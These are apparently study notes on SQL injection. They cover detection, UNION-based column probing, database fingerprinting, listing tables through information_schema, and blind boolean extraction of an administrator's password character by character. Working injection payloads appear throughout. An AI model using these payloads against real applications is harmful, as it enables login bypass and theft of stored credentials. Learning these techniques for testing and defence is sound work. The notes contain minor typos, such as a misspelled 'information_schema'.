SQLi is a web security vulnerability that allows an attacker to manipulate queries that application makes to a database. This can allow them to view data they might not normally be able to retrieve.

## Detection
Submit a Single quote ' character
Boolean conditions, OR 1=1, OR 1=2
Payloads designed to trigger time delays
OAST payloads designed to trigger an out-of-band network interaction

## SQL injection in different parts of the query
Most sql injection vulnerabilities occur in the where clause, but there are other places:
UPDATE statements
INSERT statements
SELECT statements

## Retrieving hidden data

In this URL:
```
`https://insecure-website.com/products?category=Gifts`
```

The SQL query:

```
`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
```

The query searches for all from products where the category is gift and release is 1 (or True)
If the app doesn't implement any defense, then an attack like this:

```
`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`
```

The '--' is a comment indicator in SQL, this means that everything after it isn't evaluated.

## Subverting Application Logic

When you log in to an application with a username and password, the SQL query can look like this:

```
SELECT * FROM users WHERE username = 'username' AND password = 'password'
```

An attacker can use a SQL comment after username to remove the password check.


## SQL Injection UNION attacks
UNION keyword enables you to execute one or more additional SELECT queries and append the results to the original query.
```
`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`
```

Two requirements:
- The individual queries must return the same number of columns
- The data types in each column must be compatible between the individual queries.
When performing a SQL injection UNION attack, you need to know how many columns are being returned from the original query, and which columns returned from the original query are of a suitable data type to hold the results from the injected query.

### Determining the number of columns

Two effective methods to determine number of columns:
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```
And so on.
This modifies the original query to order the results by different columns in the result set. If there is some difference in the response, then you can infer how many columns are being returned from the query.

Second Method:
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

```
And so on. 
If the number of columns does not match the number of nulls, the database returns an error.  NULL is used because the data type in each column must be compatible between the original and injected queries, and NULL is convertible to every data type.

## Database-specific syntax

**Oracle**: every select query must use the FROM keyword and specify a valid table. In Oracle, there is a built-in table called Dual.
```
' UNION SELECT NULL FROM DUAL--
```

## Finding Columns with a useful data type

The data you would usually want from a query is usually in string form (username, password, etc). So one of the columns needs to be compatible with string data.
```
' UNION SELECT 'a',NULL,NULL,NULL-- 
' UNION SELECT NULL,'a',NULL,NULL-- 
' UNION SELECT NULL,NULL,'a',NULL-- 
' UNION SELECT NULL,NULL,NULL,'a'--`
```

If the column data type is not compatible, the injected query will cause a database error.

## Retrieving Multiple Values within a single column
In some cases the query may only return a single column. You can retrieve multiple values together within the single column by concatenating the values together.

On Oracle:
```
' UNION SELECT username || '~' || password FROM users--
```

## Examining the database in SQL injection attacks 

Useful information about the database includes the type and version of the database, and the tables and columns that the database contains.

You can potentially identify both for some with these queries:

| Database type    | Query                     |
| ---------------- | ------------------------- |
| Microsoft, MySQL | `SELECT @@version`        |
| Oracle           | `SELECT * FROM v$version` |
| PostgreSQL       | `SELECT version()`        |
A union select with the following input:
`' UNION SELECT @@version--`

Could return the following output:
`Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64) Mar 18 2018 09:11:49 Copyright (c) Microsoft Corporation Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)`


## Listing the Contents of the Database

Most database types except Oracle have a set of views that provide information about the database. This is called the information scheea.

`SELECT * FROM infromation_schema.tables`

Returns output like:

| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE |
| ------------- | ------------ | ---------- | ---------- |
| MyDatabase    | dbo          | Products   | BASE TABLE |
| MyDatabase    | dbo          | Users      | BASE TABLE |
| MyDatabase    | dbo          | Feedback   | BASE TABLE |

You can then use this query: ``SELECT * FROM information_schema.columns WHERE table_name = 'Users'``
to list columns


## Blind SQL Injection
When an application is vulnerable to SQL, but the HTTP responses do not contain the results of the relevant SQL query.

Techniques such as `UNION SELECT` are not effective due to relying on being able to see the results.

**Example**: An application that uses tracking cookies.
``Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4``

The SQL query for this would be:
`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`

This query is vulnerable to SQL injections, but the results from the query are not returned to the user. It does behave differently depending on whether to query returns any data. 

If two requests are made with the TrackingID cookie value:
```
...xyz' AND '1'='1
...xyz' AND '1'='2
```

The first of these values will return with results, the second won't because the statement is logically incorrect.

| P     | Q     | $p \land q$ |
| ----- | ----- | ----------- |
| True  | True  | True        |
| True  | False | False       |
| False | True  | False       |
| False | False | False       |
Suppose there is a table called Users with columns Username and Password, and a user called Administrator. To determine the password one character at a time, you send:
`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
This returns the "Welcome back" message, because it implies that the first character of the password is greater than m.

The next query can be 
`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`
The welcome back message does not come back, so the first character is not greater than t
Eventually we send this query:
`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`
To determine the first character is `s`.

# Error Based SQL Injection

SQL Injections based on errors - inducing a specific response based on the boolean expression. Induce the application to return a different response even if the query doesn't return data - cause a database error only if condition is true
